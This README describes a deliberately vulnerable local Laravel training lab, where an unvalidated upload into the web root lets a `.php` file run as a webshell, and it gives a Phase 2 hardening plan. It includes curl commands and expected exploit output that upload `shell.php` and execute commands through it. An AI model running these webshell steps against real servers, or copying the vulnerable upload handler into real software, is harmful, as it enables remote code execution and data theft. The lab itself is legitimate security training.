# Laravel unsafe-upload lab (local only)

A deliberately vulnerable Laravel app for practicing **unsafe file upload**:
an unvalidated, client-named file lands in the web-executable `public/uploads/`
directory, so a `.php` upload becomes a webshell.

**Status: Phase 1 is live and unfixed.** The Phase 2 hardening is design-only;
none of it has been applied. Full vulnerable code, impact analysis and fix
preview live in [`ATTACK.md`](ATTACK.md).

> **Scope and safety:** the app binds to `127.0.0.1:8085` only. There is no
> Docker, no container, no system service and no restart policy. Do not expose
> it to a network, and do not reuse the lab flag or the webshell technique
> outside this local lab.

## Contents

- [Requirements](#requirements)
- [Quick start](#quick-start)
- [What is vulnerable](#what-is-vulnerable)
- [Verify the exploit](#verify-the-exploit)
- [Reset](#reset)
- [How it runs](#how-it-runs)
- [File layout](#file-layout)
- [Development notes](#development-notes)
- [Phase 2 (not applied)](#phase-2-not-applied)

## Requirements

- Linux with `bash`.
- Python 3 (standard library only) for `exploit.py`.
- No system PHP, Composer, Node, database or web server install is needed:
  the PHP 8.3 runtime, extensions and Laravel `vendor/` directory are bundled
  under `runtime/` and `app/`.

## Quick start

Run `start.sh` in one terminal — it stays in the foreground until stopped or
Ctrl-C is pressed:

```bash
cd unsafe-upload-lab
./start.sh                  # http://127.0.0.1:8085/upload
```

Then, in a second terminal:

```bash
curl -s http://127.0.0.1:8085/upload | head   # confirm the form responds
python3 exploit.py                            # upload webshell, read the flag
./stop.sh                                     # stop the server (or Ctrl-C in terminal 1)
```

`start.sh` is safe to re-run: if a live server is already recorded in
`.server.pid`, it prints the PID and exits without starting a second one.
The uploaded file is left in place between runs so the webshell can be re-used;
see [Reset](#reset) to clean it up.

## What is vulnerable

| # | Endpoint | Flaw | Flag |
|---|---|---|---|
| A | `POST /upload` | The controller passes `getClientOriginalName()` straight to `move(public_path('uploads'), ...)`, so the client controls the stored filename with no extension, MIME, size or sanitization checks. The destination is inside the web root and PHP is executable there, so `shell.php` runs as a webshell. | `FLAG{unsafe-upload-rce}` |

The form correctly includes `@csrf` and `exploit.py` fetches a real session
cookie and CSRF token first. That demonstrates CSRF tokens do **not** stop a
user who can request their own token from uploading whatever they choose.

Secondary findings:

- **Unsanitized filenames / path traversal.** The application itself applies no
  filename sanitization. Symfony's `UploadedFile::move()` happens to reduce a
  `../` name to its basename here, so traversal does not escape `uploads/`
  through this exact call, but the code is one API change away from
  arbitrary-path writes. Overwriting files *inside* `uploads/` already works.
- **Stored XSS.** `xss.html` / `xss.svg` with active script content would be
  served from the application's origin.

The flag lives at `unsafe-upload-lab/flag.txt`, **outside** `public/`, so
reading it through the webshell proves real command execution rather than a
simple file download.

## Verify the exploit

Automated (Python 3 stdlib only; keeps the session in a `CookieJar`):

```bash
python3 exploit.py
```

Expected output ends with the flag and a zero exit status:

```text
[*] Uploading webshell to http://127.0.0.1:8085/upload
[+] Upload accepted: /uploads/shell.php
[*] Webshell command: cat '/absolute/path/to/unsafe-upload-lab/flag.txt'
--- webshell response ---
FLAG{unsafe-upload-rce}
------------------------
[SUCCESS] RCE confirmed via unsafe upload: FLAG{unsafe-upload-rce}
```

The flag path is derived from `Path(__file__).resolve().parent / "flag.txt"`,
so the exploit works no matter where the lab folder lives. Re-running it is
fine: the controller's `UploadedFile::move()` overwrites an existing
`shell.php` with the same name.

Manual equivalent (the CSRF token and cookie from a prior `GET /upload` are
omitted for brevity — see [`ATTACK.md`](ATTACK.md) for the full walkthrough):

```bash
curl -F 'file=@shell.php;filename=shell.php' http://127.0.0.1:8085/upload
curl 'http://127.0.0.1:8085/uploads/shell.php?cmd=id'
curl --get --data-urlencode 'cmd=cat /absolute/path/to/unsafe-upload-lab/flag.txt' \
  http://127.0.0.1:8085/uploads/shell.php
```

See [`ATTACK.md`](ATTACK.md) for the vulnerable code, why it works, and
real-world impact.

## Reset

There is no `reset.sh` for this lab. To remove the webshell and restore the
pristine state, stop the server and delete the uploaded file:

```bash
./stop.sh
rm -f app/public/uploads/shell.php
```

Then run `./start.sh` again when needed.

## How it runs

- `runtime/php-root/usr/bin/php8.3` is used for the built-in server; no system
  PHP installation is required.
- `start.sh` generates `runtime/php.ini`, exports `PHP_INI_SCAN_DIR` and
  `LD_LIBRARY_PATH`, creates a writable `app/public/uploads/`, and records the
  server PID in `.server.pid`.
- The server runs from `app/public` with the Laravel framework router
  `app/vendor/laravel/framework/src/Illuminate/Foundation/resources/server.php`,
  bound to `127.0.0.1:8085`.
- The router returns `false` for files that already exist, so the built-in
  server handles `/uploads/shell.php` itself and **executes** it as PHP instead
  of serving its source. A real web server with `AddHandler`/`php-fpm` pointed
  at `public/uploads/` behaves the same way.
- `stop.sh` kills the recorded PID and removes `.server.pid`.

Registered routes: `GET /`, `GET|POST /upload`.

## File layout

| Path | Purpose |
|---|---|
| `start.sh` / `stop.sh` | Start/stop the loopback-only PHP server (PID file `.server.pid`) |
| `exploit.py` | Python 3 stdlib exploit: cookie + CSRF token, multipart webshell upload, command execution |
| `ATTACK.md` | Vulnerable snippets, manual exploit, impact and Phase 2 fix preview |
| `flag.txt` | Secret **outside** `public/`, read by the webshell command |
| `runtime/` | Bundled PHP 8.3 binary, libraries, extensions and generated `php.ini` |
| `app/routes/web.php` | `GET`/`POST /upload` route plus the default `/` page |
| `app/app/Http/Controllers/UploadLabController.php` | Deliberately vulnerable upload handler |
| `app/resources/views/upload-lab.blade.php` | Upload form (includes `@csrf`) |
| `app/public/uploads/` | Writable, web-executable destination (deliberate) |
| `app/README.md` | Stock Laravel boilerplate; this file is the lab guide |

## Development notes

The generated app's `AGENTS.md` conventions were followed: the controller and
view were created with `php artisan make:*`, relevant rules under
`.agents/skills/laravel-best-practices` were reviewed (there is no `.ai/rules`
directory), `php artisan route:list` was used, and `vendor/bin/pint --format
agent` was run after PHP edits.

Allowing unvalidated uploads with client-supplied filenames into a
web-executable directory is an **intentional, documented deviation** from
those security rules — it is the lab target and must not be "fixed" in Phase 1.

## Phase 2 (not applied)

1. Validate extension **and** content MIME in a `FormRequest`, e.g.
   `'file' => ['required', 'file', 'extensions:png,jpg,jpeg,webp', 'mimes:png,jpg,jpeg,webp', 'max:2048']`.
2. Generate a random stored filename (`Str::random(40)`); keep the original
   name only as escaped display metadata.
3. Store outside the docroot in `storage/app/private` via
   `$request->file('file')->store('uploads', 'private')`.
4. Serve downloads through an authorized controller with a signed/one-time URL
   and `Content-Disposition: attachment`.
5. Disable PHP execution in the upload directory as defence in depth
   (separate non-executable volume, nginx deny rule, Apache `php_flag engine
   off`) — never rely on this alone.
6. Enforce size limits in the `FormRequest`, PHP (`upload_max_filesize`,
   `post_max_size`) and the web server, plus quotas/rate limits.
7. Re-encode images to strip embedded payloads and add malware scanning before
   publishing.
8. Keep `@csrf`, add authentication/authorization for the upload endpoint, and
   log upload events for detection.

Details and code sketches are in [`ATTACK.md`](ATTACK.md). After applying any
fix, re-run `python3 exploit.py` and confirm the flag is no longer returned.
